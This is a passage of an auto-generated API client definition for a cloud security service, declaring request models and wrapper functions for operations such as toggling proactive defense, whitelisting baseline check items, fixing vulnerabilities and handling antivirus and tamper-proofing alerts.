*   **flag**: specifies whether to enable or disable proactive defense for your server. Valid values are **add** and **del**. The value add indicates that proactive defense will be enabled for your server. The value del indicates that proactive defense will be disabled for your server.

This parameter is required.', example='[
      {
            "targetType": "uuid",
            "target": "f329a044-6a2f-49a0-9d33-352f6c1d****",
            "flag": "del"
      }
]'),
  targetType?: string(name='TargetType', description='The dimension based on which the asset is selected. Valid values:

*   **uuid**: the UUID of the server
*   **Cluster**: the ID of the cluster
*   **image_repo**: the name of the image repository', example='uuid'),
  type?: string(name='Type', description='The type of the feature. Valid values:

*   **alidetect-scan-enable**: local file detection
*   **ACTION-TRIAL-PERMISSION**: data delivery to ActionTrail
*   **alidetect**: local file detection engine
*   **container_prevent_escape**: container escape prevention
*   **image_repo**: repository image scan
*   **proc_filter_switch**: log filtering
*   **agentless**: agentless detection
*   **rasp**: application protection
*   **sensitiveFile**: sensitive file detection
*   **aliscriptengine**: in-depth detection engine
*   **containerNetwork**: container network visualization

This parameter is required.', example='alidetect'),
}

model OperateCommonTargetConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='95D45C44-4F53-5ED2-8E12-7D134564B****'),
}

model OperateCommonTargetConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: OperateCommonTargetConfigResponseBody(name='body'),
}

/**
 * @summary Configures features by type. The features include container image scan, local file detection, container network visualization, and container escape prevention.
 *
 * @param request OperateCommonTargetConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return OperateCommonTargetConfigResponse
 */
async function operateCommonTargetConfigWithOptions(request: OperateCommonTargetConfigRequest, runtime: Util.RuntimeOptions): OperateCommonTargetConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.fieldName)) {
    query['FieldName'] = request.fieldName;
  }
  if (!Util.isUnset(request.fieldValue)) {
    query['FieldValue'] = request.fieldValue;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.targetOperations)) {
    query['TargetOperations'] = request.targetOperations;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateCommonTargetConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Configures features by type. The features include container image scan, local file detection, container network visualization, and container escape prevention.
 *
 * @param request OperateCommonTargetConfigRequest
 * @return OperateCommonTargetConfigResponse
 */
async function operateCommonTargetConfig(request: OperateCommonTargetConfigRequest): OperateCommonTargetConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateCommonTargetConfigWithOptions(request, runtime);
}

model OperateImageBaselineWhitelistRequest {
  baselineItemKeyList?: string(name='BaselineItemKeyList', description='The keys of baseline check items.

This parameter is required.', example='hc.image.checklist.identify.hc_exploit_es_linux.item'),
  imageUuid?: string(name='ImageUuid', description='The UUID of the image.', example='a5250ebca765dc9eb1a84b790b0e****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  operation?: string(name='Operation', description='The operation that you want to perform on the check items. Valid values:

*   **add**: adds the check items to the whitelist
*   **del**: removes the check items from the whitelist

This parameter is required.', example='add'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that you want to scan.'),
}

model OperateImageBaselineWhitelistResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='75AD186B-B46A-56CC-BE35-987ADDF6****'),
}

model OperateImageBaselineWhitelistResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: OperateImageBaselineWhitelistResponseBody(name='body'),
}

/**
 * @summary Adds a check item of an image baseline to the whitelist, or removes a check item of an image baseline from the whitelist.
 *
 * @param request OperateImageBaselineWhitelistRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return OperateImageBaselineWhitelistResponse
 */
async function operateImageBaselineWhitelistWithOptions(request: OperateImageBaselineWhitelistRequest, runtime: Util.RuntimeOptions): OperateImageBaselineWhitelistResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.baselineItemKeyList)) {
    query['BaselineItemKeyList'] = request.baselineItemKeyList;
  }
  if (!Util.isUnset(request.imageUuid)) {
    query['ImageUuid'] = request.imageUuid;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.operation)) {
    query['Operation'] = request.operation;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateImageBaselineWhitelist',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Adds a check item of an image baseline to the whitelist, or removes a check item of an image baseline from the whitelist.
 *
 * @param request OperateImageBaselineWhitelistRequest
 * @return OperateImageBaselineWhitelistResponse
 */
async function operateImageBaselineWhitelist(request: OperateImageBaselineWhitelistRequest): OperateImageBaselineWhitelistResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateImageBaselineWhitelistWithOptions(request, runtime);
}

model OperateImageVulRequest {
  info?: string(name='Info', description='The information about the vulnerability. The value of this parameter is in the JSON format and contains the following fields:

*   namespace: the namespace of the image
*   repoName: the name of the Container Registry repository
*   regionId: the region ID
*   instanceId: the ID of the Container Registry instance
*   repoId: the name of the repository
*   tag: the tad added to the image
*   digest: the digest of the image
*   newTag: the tag added to the image after the vulnerability is fixed
*   uuid: the UUID of the image
*   ids: the IDs of the vulnerability primary keys', example='[{\\\\"namespace\\\\":\\\\"cloud_oa****\\\\",\\\\"repoName\\\\":\\\\"hybirdc****\\\\",\\\\"regionId\\\\":\\\\"cn-shanghai\\\\",\\\\"instanceId\\\\":\\\\"cri-rv4nvbv8iju4****\\\\",\\\\"repoId\\\\":\\\\"crr-2q7302qrofxg****\\\\",\\\\"tag\\\\":\\\\"hybird-cloud-web_fix_167115945****\\\\",\\\\"digest\\\\":\\\\"e1a4fd25884ca2ef8840bb252c9926e4f549df9e046500dd93539b2d458c****\\\\",\\\\"newTag\\\\":\\\\"hybird-cloud-web_fix_167115996****\\\\",\\\\"uuid\\\\":\\\\"4ad91dd8c0c02de6574fa98085d0****\\\\",\\\\"ids\\\\":[197540864,197540865,197540869]}]'),
  operateType?: string(name='OperateType', description='If you want to fix the vulnerability, set the value to vul_fix.', example='vul_fix'),
  type?: string(name='Type', description='The type of the vulnerability. Set the value to cve.', example='cve'),
}

model OperateImageVulResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='486F2228-438A-544A-A533-433F943C15CD'),
}

model OperateImageVulResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: OperateImageVulResponseBody(name='body'),
}

/**
 * @summary Handles an image vulnerability, such as fixing the image vulnerability, verifying the fix of the image vulnerability, ignoring the image vulnerability, or canceling ignoring the image vulnerability.
 *
 * @param request OperateImageVulRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return OperateImageVulResponse
 */
async function operateImageVulWithOptions(request: OperateImageVulRequest, runtime: Util.RuntimeOptions): OperateImageVulResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.info)) {
    query['Info'] = request.info;
  }
  if (!Util.isUnset(request.operateType)) {
    query['OperateType'] = request.operateType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateImageVul',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Handles an image vulnerability, such as fixing the image vulnerability, verifying the fix of the image vulnerability, ignoring the image vulnerability, or canceling ignoring the image vulnerability.
 *
 * @param request OperateImageVulRequest
 * @return OperateImageVulResponse
 */
async function operateImageVul(request: OperateImageVulRequest): OperateImageVulResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateImageVulWithOptions(request, runtime);
}

model OperateSuspiciousOverallConfigRequest {
  config?: string(name='Config', description='Specifies whether to enable the feature. Valid values:

*   **on**: yes
*   **off**: no

This parameter is required.', example='off'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  noTargetAsOn?: boolean(name='NoTargetAsOn', description='Specifies whether to configure assets for the feature. Default value: **false**. Valid values:

*   **true**: yes
*   **false**: no

>  This parameter takes effect only when you set **Config** to **on**.', example='true'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='222.178.XX.XX'),
  type?: string(name='Type', description='The type of the feature. Valid values:

*   **auto_breaking**: Anti-Virus
*   **ransomware_breaking**: Anti-ransomware (Bait Capture)
*   **webshell_cloud_breaking**: Webshell Protection
*   **alinet**: Behavior prevention
*   **k8s_log_analysis**: K8s Threat Detection
*   **alisecguard**: Defense mode for Client Protection

This parameter is required.', example='k8s_log_analysis'),
}

model OperateSuspiciousOverallConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C286491D-4A2F-589A-B63B-D2AD3DA9BD71'),
}

model OperateSuspiciousOverallConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: OperateSuspiciousOverallConfigResponseBody(name='body'),
}

/**
 * @summary Enables or disables a feature that detects exceptions.
 *
 * @param request OperateSuspiciousOverallConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return OperateSuspiciousOverallConfigResponse
 */
async function operateSuspiciousOverallConfigWithOptions(request: OperateSuspiciousOverallConfigRequest, runtime: Util.RuntimeOptions): OperateSuspiciousOverallConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.noTargetAsOn)) {
    query['NoTargetAsOn'] = request.noTargetAsOn;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateSuspiciousOverallConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Enables or disables a feature that detects exceptions.
 *
 * @param request OperateSuspiciousOverallConfigRequest
 * @return OperateSuspiciousOverallConfigResponse
 */
async function operateSuspiciousOverallConfig(request: OperateSuspiciousOverallConfigRequest): OperateSuspiciousOverallConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateSuspiciousOverallConfigWithOptions(request, runtime);
}

model OperateSuspiciousTargetConfigRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  targetOperations?: string(name='TargetOperations', description='The configuration of proactive defense for your server. The value includes the following fields:

*   **targetType**: specifies the dimension from which you manage proactive defense. UUIDs are supported. Set the value to **uuid**.
*   **target**: specifies the UUID of the server for which you want to configure proactive defense.
*   **flag**: specifies whether to enable or disable proactive defense for your server. Valid values are **add** and **del**. The value add indicates that proactive defense will be enabled for your server. The value del indicates that proactive defense will be disabled for your server.

This parameter is required.', example='"[{"targetType":"uuid","target":"0585f81a-dd84-4ddf-9971-f59d12345678","flag":"add"},{"targetType":"uuid","target":"01acfd9d-e6a4-4e61-b9eb-aae012345678","flag":"add"},{"targetType":"uuid","target":"04a0e735-ad32-4835-b635-045812345678","flag":"add"}]"'),
  targetType?: string(name='TargetType', description='The dimension from which you manage proactive defense. Only the server UUID dimension is supported.

Set the value to **uuid**.

This parameter is required.', example='uuid'),
  type?: string(name='Type', description='The type of proactive defense. Valid Values:

*   **auto_breaking**: automatic blocking
*   **webshell_cloud_breaking**: webshell defense
*   **alinet**: malicious behavior defense
*   **ransomware_breaking**: ransomware capture
*   **alisecguard**: client protection

This parameter is required.', example='auto_breaking'),
}

model OperateSuspiciousTargetConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='ABCD-PSD2-5256-1DSA-4222-JHBN'),
}

model OperateSuspiciousTargetConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: OperateSuspiciousTargetConfigResponseBody(name='body'),
}

/**
 * @summary Configures the scope on which proactive defense takes effect.
 *
 * @param request OperateSuspiciousTargetConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return OperateSuspiciousTargetConfigResponse
 */
async function operateSuspiciousTargetConfigWithOptions(request: OperateSuspiciousTargetConfigRequest, runtime: Util.RuntimeOptions): OperateSuspiciousTargetConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.targetOperations)) {
    query['TargetOperations'] = request.targetOperations;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateSuspiciousTargetConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Configures the scope on which proactive defense takes effect.
 *
 * @param request OperateSuspiciousTargetConfigRequest
 * @return OperateSuspiciousTargetConfigResponse
 */
async function operateSuspiciousTargetConfig(request: OperateSuspiciousTargetConfigRequest): OperateSuspiciousTargetConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateSuspiciousTargetConfigWithOptions(request, runtime);
}

model OperateSwitchStatusRequest {
  ruleId?: long(name='RuleId', description='The ID of the rule.

>  You can call the ListContainerWebDefenseRule operation to query the IDs of rules.

This parameter is required.', example='900001'),
  status?: string(name='Status', description='The status of the rule. Valid values: on and off.

This parameter is required.', example='on'),
}

model OperateSwitchStatusResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='8AE9D3DA-406B-51FA-AA1C-89440C1459BF'),
}

model OperateSwitchStatusResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: OperateSwitchStatusResponseBody(name='body'),
}

/**
 * @summary Changes the status of a rule for container tamper-proofing.
 *
 * @param request OperateSwitchStatusRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return OperateSwitchStatusResponse
 */
async function operateSwitchStatusWithOptions(request: OperateSwitchStatusRequest, runtime: Util.RuntimeOptions): OperateSwitchStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.ruleId)) {
    query['RuleId'] = request.ruleId;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateSwitchStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Changes the status of a rule for container tamper-proofing.
 *
 * @param request OperateSwitchStatusRequest
 * @return OperateSwitchStatusResponse
 */
async function operateSwitchStatus(request: OperateSwitchStatusRequest): OperateSwitchStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateSwitchStatusWithOptions(request, runtime);
}

model OperateVirusEventsRequest {
  operationAll?: int32(name='OperationAll', description='Specifies whether to handle all alert events. Valid values:

*   **1**: yes
*   **0**: no

This parameter is required.', example='0'),
  operationCode?: string(name='OperationCode', description='The operation that you want to perform on the alert events. Valid values:

*   **default**: performs in-depth detection and removal
*   **ignore**: ignores the alert event
*   **advance_mark_mis_info**: adds the alert events to the whitelist
*   **manual_handled**: marks the alert events as manually handled

This parameter is required.', example='default'),
  operationRange?: string(name='OperationRange', description='The handling scope.', example='[{\\\\"type\\\\":\\\\"machine\\\\",\\\\"list\\\\":[\\\\"xxxxxxxxx-4cbf-4ca6-a1b7-8a09d1f86ab0\\\\"]}]'),
}

model OperateVirusEventsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='B72BEC03-001C-5C77-A4BB-1E6XXXXXXX'),
  taskId?: long(name='TaskId', description='The ID of the task to handle multiple alert events at a time.', example='1'),
}

model OperateVirusEventsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: OperateVirusEventsResponseBody(name='body'),
}

/**
 * @summary Handles alert events that are generated by the antivirus feature. You can perform in-depth detection and removal, add alert events to the whitelist, ignore alert events, or manually handle alert events.
 *
 * @param request OperateVirusEventsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return OperateVirusEventsResponse
 */
async function operateVirusEventsWithOptions(request: OperateVirusEventsRequest, runtime: Util.RuntimeOptions): OperateVirusEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.operationAll)) {
    query['OperationAll'] = request.operationAll;
  }
  if (!Util.isUnset(request.operationCode)) {
    query['OperationCode'] = request.operationCode;
  }
  if (!Util.isUnset(request.operationRange)) {
    query['OperationRange'] = request.operationRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateVirusEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Handles alert events that are generated by the antivirus feature. You can perform in-depth detection and removal, add alert events to the whitelist, ignore alert events, or manually handle alert events.
 *
 * @param request OperateVirusEventsRequest
 * @return OperateVirusEventsResponse
 */
async function operateVirusEvents(request: OperateVirusEventsRequest): OperateVirusEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateVirusEventsWithOptions(request, runtime);
}

model OperateVulsRequest {
  operateType?: string(name='OperateType', description='The operation on the vulnerabilities. Set the value to **vul_fix**, which indicates vulnerability fixing.

This parameter is required.', example='vul_fix'),
  type?: string(name='Type', description='The type of the vulnerabilities that you want to fix. Set the value to **cve**, which indicates Linux software vulnerabilities.

This parameter is required.', example='cve'),
  uuids?: [ string ](name='Uuids', description='The UUIDs of servers for which you want to fix vulnerabilities.

This parameter is required.'),
  vulNames?: [ string ](name='VulNames', description='The names of the vulnerabilities that you want to fix.

This parameter is required.'),
}

model OperateVulsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C2677612-7207-4AEB-BD48-8BA528F86777'),
}

model OperateVulsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: OperateVulsResponseBody(name='body'),
}

/**
 * @summary Fixes Linux software vulnerabilities.
 *
 * @param request OperateVulsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return OperateVulsResponse
 */
async function operateVulsWithOptions(request: OperateVulsRequest, runtime: Util.RuntimeOptions): OperateVulsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.operateType)) {
    query['OperateType'] = request.operateType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  if (!Util.isUnset(request.vulNames)) {
    query['VulNames'] = request.vulNames;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateVuls',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Fixes Linux software vulnerabilities.
 *
 * @param request OperateVulsRequest
 * @return OperateVulsResponse
 */
async function operateVuls(request: OperateVulsRequest): OperateVulsResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateVulsWithOptions(request, runtime);
}

model OperateWebLockFileEventsRequest {
  dealAll?: int32(name='DealAll', description='Specifies whether to handle all alert events that are generated for web tamper proofing. Valid values:

*   **1**: yes
*   **0**: no

This parameter is required.', example='1'),
  eventIds?: [ long ](name='EventIds', description='The IDs of alert events.

This parameter is required.'),
  operationCode?: string(name='OperationCode', description='The operation that you want to perform on the alert events. Valid values:

*   **mark_mis_info**: marks the alert events as false positives
*   **rm_mark_mis_info**: cancels marking the alerts events as false positives
*   **offline_handled**: marks the alert events as handled offline
*   **whitelist**: adds the alert events to the whitelist
*   **rm_whitelist**: cancels adding the alert events to the whitelist

This parameter is required.', example='whitelist'),
}

model OperateWebLockFileEventsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='2884C186-E8C0-5611-8207-3FF15EE7D9B4'),
}

model OperateWebLockFileEventsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: OperateWebLockFileEventsResponseBody(name='body'),
}

/**
 * @summary Handles alert events that are generated for web tamper proofing.
 *
 * @param request OperateWebLockFileEventsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return OperateWebLockFileEventsResponse
 */
async function operateWebLockFileEventsWithOptions(request: OperateWebLockFileEventsRequest, runtime: Util.RuntimeOptions): OperateWebLockFileEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.dealAll)) {
    query['DealAll'] = request.dealAll;
  }
  if (!Util.isUnset(request.eventIds)) {
    query['EventIds'] = request.eventIds;
  }
  if (!Util.isUnset(request.operationCode)) {
    query['OperationCode'] = request.operationCode;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateWebLockFileEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Handles alert events that are generated for web tamper proofing.
 *
 * @param request OperateWebLockFileEventsRequest
 * @return OperateWebLockFileEventsResponse
 */
async function operateWebLockFileEvents(request: OperateWebLockFileEventsRequest): OperateWebLockFileEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateWebLockFileEventsWithOptions(request, runtime);
}

model OperationCancelIgnoreSuspEventRequest {
  remark?: string(name='Remark', description='The remarks.', example='remark text'),
  securityEventIds?: [ long ](name='SecurityEventIds', description='The IDs of alert events.

This parameter is required.'),
}

model OperationCancelIgnoreSuspEventResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was is successful. Other status codes indicate that the request fails. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
  success?: boolean(name='Success', description='The handling result of an exception. Valid values:

*   **true**: successful
*   **false**: failed', example='true'),
  timeCost?: long(name='TimeCost', description='The time consumed for the request. Unit: seconds.', example='1'),
}

model OperationCancelIgnoreSuspEventResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: OperationCancelIgnoreSuspEventResponseBody(name='body'),
}

/**
 * @summary Cancels ignoring alert events.
 *
 * @param request OperationCancelIgnoreSuspEventRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return OperationCancelIgnoreSuspEventResponse
 */
async function operationCancelIgnoreSuspEventWithOptions(request: OperationCancelIgnoreSuspEventRequest, runtime: Util.RuntimeOptions): OperationCancelIgnoreSuspEventResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.securityEventIds)) {
    query['SecurityEventIds'] = request.securityEventIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperationCancelIgnoreSuspEvent',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Cancels ignoring alert events.
 *
 * @param request OperationCancelIgnoreSuspEventRequest
 * @return OperationCancelIgnoreSuspEventResponse
 */
async function operationCancelIgnoreSuspEvent(request: OperationCancelIgnoreSuspEventRequest): OperationCancelIgnoreSuspEventResponse {
  var runtime = new Util.RuntimeOptions{};
  return operationCancelIgnoreSuspEventWithOptions(request, runtime);
}

model OperationCustomizeReportChartRequest {
  chartIds?: string(name='ChartIds', description='The ID of the chart that is included in the report. Separate multiple IDs with commas (,).

>  You can call the [DescribeChartList](~~DescribeChartList~~) operation to query the ID.

This parameter is required.', example='CID_VUL_SUMMARY,CID_VUL_TREND,CID_VUL_OPERATION_TREND,CID_BASELINE_CHECK_SUMMARY,CID_BASELINE_CHECK_TREND,CID_BASELINE_CHECK_OPERATION_TREND'),
  reportId?: long(name='ReportId', description='The ID of the report.

>  You can call the [DescribeCustomizeReportList](~~DescribeCustomizeReportList~~) operation to query the ID.

This parameter is required.', example='123'),
}

model OperationCustomizeReportChartResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='432B2D4E-C8D3-52E4-9F68-35E0C05F****'),
}

model OperationCustomizeReportChartResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: OperationCustomizeReportChartResponseBody(name='body'),
}

/**
 * @summary Modifies the chart of a security report.
 *
 * @param request OperationCustomizeReportChartRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return OperationCustomizeReportChartResponse
 */
async function operationCustomizeReportChartWithOptions(request: OperationCustomizeReportChartRequest, runtime: Util.RuntimeOptions): OperationCustomizeReportChartResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.chartIds)) {
    query['ChartIds'] = request.chartIds;
  }
  if (!Util.isUnset(request.reportId)) {
    query['ReportId'] = request.reportId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperationCustomizeReportChart',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the chart of a security report.
 *
 * @param request OperationCustomizeReportChartRequest
 * @return OperationCustomizeReportChartResponse
 */
async function operationCustomizeReportChart(request: OperationCustomizeReportChartRequest): OperationCustomizeReportChartResponse {
  var runtime = new Util.RuntimeOptions{};
  return operationCustomizeReportChartWithOptions(request, runtime);
}

model OperationSuspEventsRequest {
  from?: string(name='From', description='The ID of the request source.

